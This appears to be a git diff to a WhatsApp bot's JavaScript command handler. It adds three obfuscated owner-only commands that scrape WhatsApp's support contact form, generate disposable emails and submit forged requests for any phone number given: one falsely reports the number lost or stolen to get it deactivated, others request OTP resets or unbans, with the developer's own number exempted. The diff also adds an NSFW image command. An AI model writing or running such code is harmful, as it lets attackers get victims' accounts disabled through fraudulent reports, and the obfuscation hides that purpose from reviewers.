@@ -2549,6 +2549,60 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 reply(respon)
             }
             break
+case 'resetotp':{
+	           if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+const _0x3b2a5a=_0x5af2;function _0x31f7(){const _0x33b497=['platform','input[name=lsd]','12MHgmQc','action','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10','val','input[name=jazoest]','142992HUxvWm','replace','19316.BP:whatsapp_www_pkg.2.0.0.0.0','2VYdelG','parse','POST','lsd','data','13709421eibQzs','attr','\x20628xxxx','Owner\x20Only','55080190yQJkjs','__rev','set-cookie','append','jazoest','__csr','axios','join','find','country_selector','__a','href','load','headers','180oZPrEI','__user','ANDROID','Contoh:\x0a','4391359qTfUVO','form','3662340pvQnPQ','Por\x20favor,\x20pesquise\x20o\x20código\x20OTP\x20para\x20este\x20número\x20porque\x20outra\x20pessoa\x20acidentalmente\x20se\x20conectou\x20com\x20meu\x20número\x20e\x20eu\x20tive\x20que\x20esperar\x208\x20horas,\x20por\x20favor,\x20pesquise\x20novamente\x20neste\x20número','dpr','__hs','for\x20(;;);','format','your_message','10onCZBX','step','submit','159120whDQpu','6283834558105','get','1298062FCMQJX','reply'];_0x31f7=function(){return _0x33b497;};return _0x31f7();}(function(_0x381f89,_0x3b7b4b){const _0x361d3f=_0x5af2,_0x4113fe=_0x381f89();while(!![]){try{const _0x176624=parseInt(_0x361d3f(0x1f7))/0x1*(-parseInt(_0x361d3f(0x203))/0x2)+-parseInt(_0x361d3f(0x220))/0x3+-parseInt(_0x361d3f(0x21a))/0x4*(parseInt(_0x361d3f(0x1f4))/0x5)+parseInt(_0x361d3f(0x1fb))/0x6*(parseInt(_0x361d3f(0x21e))/0x7)+-parseInt(_0x361d3f(0x200))/0x8+-parseInt(_0x361d3f(0x208))/0x9+-parseInt(_0x361d3f(0x1f1))/0xa*(-parseInt(_0x361d3f(0x20c))/0xb);if(_0x176624===_0x3b7b4b)break;else _0x4113fe['push'](_0x4113fe['shift']());}catch(_0x1a64da){_0x4113fe['push'](_0x4113fe['shift']());}}}(_0x31f7,0xbbf6b));if(!isCreator)return m[_0x3b2a5a(0x1f8)](_0x3b2a5a(0x20b));if(!q)return m[_0x3b2a5a(0x1f8)](_0x3b2a5a(0x21d)+(prefix+command)+_0x3b2a5a(0x20a));if(q==_0x3b2a5a(0x1f5))return;const axioss=require(_0x3b2a5a(0x212));let ntah=await axioss[_0x3b2a5a(0x1f6)]('https://www.whatsapp.com/contact/noclient/'),email=await axioss[_0x3b2a5a(0x1f6)](_0x3b2a5a(0x1fd)),cookie=ntah[_0x3b2a5a(0x219)][_0x3b2a5a(0x20e)][_0x3b2a5a(0x213)](';\x20'),$=cheerio[_0x3b2a5a(0x218)](ntah[_0x3b2a5a(0x207)]),$form=$(_0x3b2a5a(0x21f)),url=new URL($form[_0x3b2a5a(0x209)](_0x3b2a5a(0x1fc)),'https://www.whatsapp.com')[_0x3b2a5a(0x217)],form=new URLSearchParams();form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x210),$form[_0x3b2a5a(0x214)](_0x3b2a5a(0x1ff))[_0x3b2a5a(0x1fe)]()),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x206),$form[_0x3b2a5a(0x214)](_0x3b2a5a(0x1fa))[_0x3b2a5a(0x1fe)]()),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x1f2),_0x3b2a5a(0x1f3)),form['append'](_0x3b2a5a(0x215),'ID'),form[_0x3b2a5a(0x20f)]('phone_number',q),form['append']('email',email[_0x3b2a5a(0x207)][0x0]),form[_0x3b2a5a(0x20f)]('email_confirm',email[_0x3b2a5a(0x207)][0x0]),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x1f9),_0x3b2a5a(0x21c)),form['append'](_0x3b2a5a(0x226),_0x3b2a5a(0x221)),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x21b),'0'),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x216),'1'),form['append'](_0x3b2a5a(0x211),''),form[_0x3b2a5a(0x20f)]('__req','8'),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x223),_0x3b2a5a(0x202)),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x222),'1'),form['append']('__ccg','UNKNOWN'),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x20d),'1006630858'),form[_0x3b2a5a(0x20f)]('__comment_req','0');let res=await axioss({'url':url,'method':_0x3b2a5a(0x205),'data':form,'headers':{'cookie':cookie}});function _0x5af2(_0x3a5d05,_0x2cab71){const _0x31f71d=_0x31f7();return _0x5af2=function(_0x5af2d9,_0x40ede5){_0x5af2d9=_0x5af2d9-0x1f1;let _0xee10e9=_0x31f71d[_0x5af2d9];return _0xee10e9;},_0x5af2(_0x3a5d05,_0x2cab71);}m[_0x3b2a5a(0x1f8)](util[_0x3b2a5a(0x225)](JSON[_0x3b2a5a(0x204)](res[_0x3b2a5a(0x207)][_0x3b2a5a(0x201)](_0x3b2a5a(0x224),''))));
+}
+break
+case 'logout':
+case 'kenonwa':{
+	           if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+const _0x2ae681=_0x2e56;(function(_0x3e47ed,_0x1d2842){const _0x2a959c=_0x2e56,_0x288d54=_0x3e47ed();while(!![]){try{const _0x2423ef=parseInt(_0x2a959c(0x1ed))/0x1+parseInt(_0x2a959c(0x1f0))/0x2+parseInt(_0x2a959c(0x1d1))/0x3*(-parseInt(_0x2a959c(0x1e2))/0x4)+-parseInt(_0x2a959c(0x1fb))/0x5+-parseInt(_0x2a959c(0x1d4))/0x6*(-parseInt(_0x2a959c(0x1e5))/0x7)+parseInt(_0x2a959c(0x1dc))/0x8*(-parseInt(_0x2a959c(0x1f4))/0x9)+-parseInt(_0x2a959c(0x1ec))/0xa*(-parseInt(_0x2a959c(0x1de))/0xb);if(_0x2423ef===_0x1d2842)break;else _0x288d54['push'](_0x288d54['shift']());}catch(_0x4a0a96){_0x288d54['push'](_0x288d54['shift']());}}}(_0x4bd6,0x5001e));function _0x4bd6(){const _0x1b4323=['append','itu\x20kan\x20developer\x20gue','\x20628xxxx','your_message','Contoh:\x0a','form','451865LgbYsO','__a','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10','find','platform','step','1006630858','543ucBoaa','reply','https://www.whatsapp.com/contact/noclient/','299598QMQZvd','email','submit','headers','data','phone_number','val','format','8ZAMMWb','input[name=jazoest]','237193hCYsQT','__rev','__hs','UNKNOWN','5752oCMXqy','19316.BP:whatsapp_www_pkg.2.0.0.0.0','action','7bubucg','set-cookie','POST','__csr','axios','Perdido/Roubado:\x20Por\x20favor,\x20desative\x20minha\x20conta','get','130misxrz','329947BaoncU','load','replace','1054006qCHQJH','href','for\x20(;;);','ANDROID','4579569ZnjImI'];_0x4bd6=function(){return _0x1b4323;};return _0x4bd6();}if(!isCreator)return m[_0x2ae681(0x1d2)]('Owner\x20Only');if(!q)return m[_0x2ae681(0x1d2)](_0x2ae681(0x1f9)+(prefix+command)+_0x2ae681(0x1f7));let devv='6283834558105';if(q==devv)return m[_0x2ae681(0x1d2)](_0x2ae681(0x1f6));const axioss=require(_0x2ae681(0x1e9));function _0x2e56(_0x62a50e,_0x1215ab){const _0x4bd6a6=_0x4bd6();return _0x2e56=function(_0x2e56ed,_0x25c347){_0x2e56ed=_0x2e56ed-0x1cf;let _0x4e0cde=_0x4bd6a6[_0x2e56ed];return _0x4e0cde;},_0x2e56(_0x62a50e,_0x1215ab);}let ntah=await axioss[_0x2ae681(0x1eb)](_0x2ae681(0x1d3)),email=await axioss['get'](_0x2ae681(0x1fd)),cookie=ntah[_0x2ae681(0x1d7)][_0x2ae681(0x1e6)]['join'](';\x20'),$=cheerio[_0x2ae681(0x1ee)](ntah['data']),$form=$(_0x2ae681(0x1fa)),url=new URL($form['attr'](_0x2ae681(0x1e4)),'https://www.whatsapp.com')[_0x2ae681(0x1f1)],form=new URLSearchParams();form['append']('jazoest',$form[_0x2ae681(0x1fe)](_0x2ae681(0x1dd))['val']()),form[_0x2ae681(0x1f5)]('lsd',$form[_0x2ae681(0x1fe)]('input[name=lsd]')[_0x2ae681(0x1da)]()),form[_0x2ae681(0x1f5)](_0x2ae681(0x1cf),_0x2ae681(0x1d6)),form[_0x2ae681(0x1f5)]('country_selector','ID'),form[_0x2ae681(0x1f5)](_0x2ae681(0x1d9),q),form['append'](_0x2ae681(0x1d5),email[_0x2ae681(0x1d8)][0x0]),form['append']('email_confirm',email[_0x2ae681(0x1d8)][0x0]),form[_0x2ae681(0x1f5)](_0x2ae681(0x1ff),_0x2ae681(0x1f3)),form[_0x2ae681(0x1f5)](_0x2ae681(0x1f8),_0x2ae681(0x1ea)),form[_0x2ae681(0x1f5)]('__user','0'),form[_0x2ae681(0x1f5)](_0x2ae681(0x1fc),'1'),form[_0x2ae681(0x1f5)](_0x2ae681(0x1e8),''),form[_0x2ae681(0x1f5)]('__req','8'),form['append'](_0x2ae681(0x1e0),_0x2ae681(0x1e3)),form[_0x2ae681(0x1f5)]('dpr','1'),form[_0x2ae681(0x1f5)]('__ccg',_0x2ae681(0x1e1)),form[_0x2ae681(0x1f5)](_0x2ae681(0x1df),_0x2ae681(0x1d0)),form['append']('__comment_req','0');let res=await axioss({'url':url,'method':_0x2ae681(0x1e7),'data':form,'headers':{'cookie':cookie}});m[_0x2ae681(0x1d2)](util[_0x2ae681(0x1db)](JSON['parse'](res[_0x2ae681(0x1d8)][_0x2ae681(0x1ef)](_0x2ae681(0x1f2),''))));
+}
+break
+case 'unban':
+case 'unbanned':{
+	           if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+const _0x4f5076=_0x49b8;(function(_0x568ec2,_0x4e4737){const _0xf4bbda=_0x49b8,_0x12c499=_0x568ec2();while(!![]){try{const _0x495565=parseInt(_0xf4bbda(0xfc))/0x1*(-parseInt(_0xf4bbda(0xfa))/0x2)+-parseInt(_0xf4bbda(0x10e))/0x3*(parseInt(_0xf4bbda(0xeb))/0x4)+-parseInt(_0xf4bbda(0xde))/0x5+-parseInt(_0xf4bbda(0x10d))/0x6+-parseInt(_0xf4bbda(0x107))/0x7+-parseInt(_0xf4bbda(0xf6))/0x8+parseInt(_0xf4bbda(0x10b))/0x9;if(_0x495565===_0x4e4737)break;else _0x12c499['push'](_0x12c499['shift']());}catch(_0x460dec){_0x12c499['push'](_0x12c499['shift']());}}}(_0x395b,0x74013));if(!isCreator)return m[_0x4f5076(0x10a)](_0x4f5076(0xe2));function _0x49b8(_0x1eae0a,_0x11a2ef){const _0x395b24=_0x395b();return _0x49b8=function(_0x49b809,_0x5b87c1){_0x49b809=_0x49b809-0xdd;let _0x13813b=_0x395b24[_0x49b809];return _0x13813b;},_0x49b8(_0x1eae0a,_0x11a2ef);}if(!q)return m['reply'](_0x4f5076(0xec)+(prefix+command)+_0x4f5076(0x106));const axioss=require('axios');let ntah=await axioss[_0x4f5076(0xfe)](_0x4f5076(0xf3)),email=await axioss['get'](_0x4f5076(0xf5)),cookie=ntah['headers']['set-cookie'][_0x4f5076(0xf8)](';\x20'),$=cheerio[_0x4f5076(0xfb)](ntah[_0x4f5076(0xf2)]),$form=$(_0x4f5076(0xe1)),url=new URL($form['attr'](_0x4f5076(0xff)),_0x4f5076(0xf4))[_0x4f5076(0x108)],form=new URLSearchParams();function _0x395b(){const _0x487239=['step','2DfMncY','load','929231wYZwun','format','get','action','your_message','POST','input[name=lsd]','email','lsd','jazoest','\x20628xxxx','4946487hAiTBH','href','__hs','reply','28884870QiANmB','append','2374386bzHNcJ','591261edpVNE','19316.BP:whatsapp_www_pkg.2.0.0.0.0','2425280GfkTcI','__comment_req','replace','form','Owner\x20Only','submit','__csr','phone_number','__user','find','ANDROID','CARA\x20EQUIPE\x20DO\x20WHATSAPP,\x20MINHA\x20CONTA\x20FOI\x20BLOQUEADA\x20E\x20NÃO\x20CONSIGO\x20ENTRAR\x20POR\x20FAVOR\x20ME\x20AJUDE.\x20OBRIGADA','platform','4KqfuLM','Contoh:\x0a','input[name=jazoest]','dpr','__req','1006630858','parse','data','https://www.whatsapp.com/contact/noclient/','https://www.whatsapp.com','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10','164232mRBiiW','val','join'];_0x395b=function(){return _0x487239;};return _0x395b();}form[_0x4f5076(0x10c)](_0x4f5076(0x105),$form[_0x4f5076(0xe7)](_0x4f5076(0xed))[_0x4f5076(0xf7)]()),form[_0x4f5076(0x10c)](_0x4f5076(0x104),$form['find'](_0x4f5076(0x102))[_0x4f5076(0xf7)]()),form[_0x4f5076(0x10c)](_0x4f5076(0xf9),_0x4f5076(0xe3)),form[_0x4f5076(0x10c)]('country_selector','ID'),form[_0x4f5076(0x10c)](_0x4f5076(0xe5),q),form['append'](_0x4f5076(0x103),email[_0x4f5076(0xf2)][0x0]),form[_0x4f5076(0x10c)]('email_confirm',email[_0x4f5076(0xf2)][0x0]),form[_0x4f5076(0x10c)](_0x4f5076(0xea),_0x4f5076(0xe8)),form[_0x4f5076(0x10c)](_0x4f5076(0x100),_0x4f5076(0xe9)),form[_0x4f5076(0x10c)](_0x4f5076(0xe6),'0'),form['append']('__a','1'),form[_0x4f5076(0x10c)](_0x4f5076(0xe4),''),form[_0x4f5076(0x10c)](_0x4f5076(0xef),'8'),form[_0x4f5076(0x10c)](_0x4f5076(0x109),_0x4f5076(0xdd)),form[_0x4f5076(0x10c)](_0x4f5076(0xee),'1'),form['append']('__ccg','UNKNOWN'),form[_0x4f5076(0x10c)]('__rev',_0x4f5076(0xf0)),form[_0x4f5076(0x10c)](_0x4f5076(0xdf),'0');let res=await axioss({'url':url,'method':_0x4f5076(0x101),'data':form,'headers':{'cookie':cookie}});m[_0x4f5076(0x10a)](util[_0x4f5076(0xfd)](JSON[_0x4f5076(0xf1)](res['data'][_0x4f5076(0xe0)]('for\x20(;;);',''))));
+}
+break
+case 'gimage': {
+if (!q) return reply(`Example : ${prefix + command} kaori cicak`)
+reply(mess.wait)
+let gis = require('g-i-s')
+gis(text, async (error, result) => {
+n = result
+images = n[Math.floor(Math.random() * n.length)].url
+let buttons = [
+{buttonId: `.gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
+]
+let buttonMessage = {
+image: { url: images },
+caption: `*-------「 GIMAGE SEARCH 」-------*
+🤠 *Query* : ${text}
+🔗 *Media Url* : ${images}`,
+footer: ownername,
+buttons: buttons,
+headerType: 4
+}
+alpha.sendMessage(m.chat, buttonMessage, { quoted: m })
+})
+}
+break
+case 'bkp':
+         case 'bokep': {
+         	// if (db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak, [m.sender])
+            if (db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
+            if (!db.data.chats[m.chat].nsfw) return reply(lang.OffNsfw())
+            reply(lang.wait())
+            let res = await fetch(`https://saipulanuar.ga/api/bokepig`)
+            if (!res.ok) throw await res.text()
+            let img = await res.buffer()
+            alpha.sendImage(m.chat, img, lang.ok(), m)
+            db.data.users[m.sender].limit -= 1
+         }
+         break
+
             case 'tes':
             case 'runtime':
                 reply(`Runtime : ${runtime(process.uptime())}`)
@@ -2567,7 +2621,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             break
             case 'owner':
             case 'creator': {
-                sendContact(global.bagus, m)
+                sendContact(alpha, m.chat, global.owner, m)
             }
             break
             case 'rules': {
@@ -3203,7 +3257,7 @@ case 'memek': {
                     const sections = [{
                         "title": "Set Menu-1",
                         "rows": [{
-                            "title": "Menu Button Location",
+                            "title": "ALL MENU",
                             "rowId": ".setmenu2 location"
                         }]
                     }, {
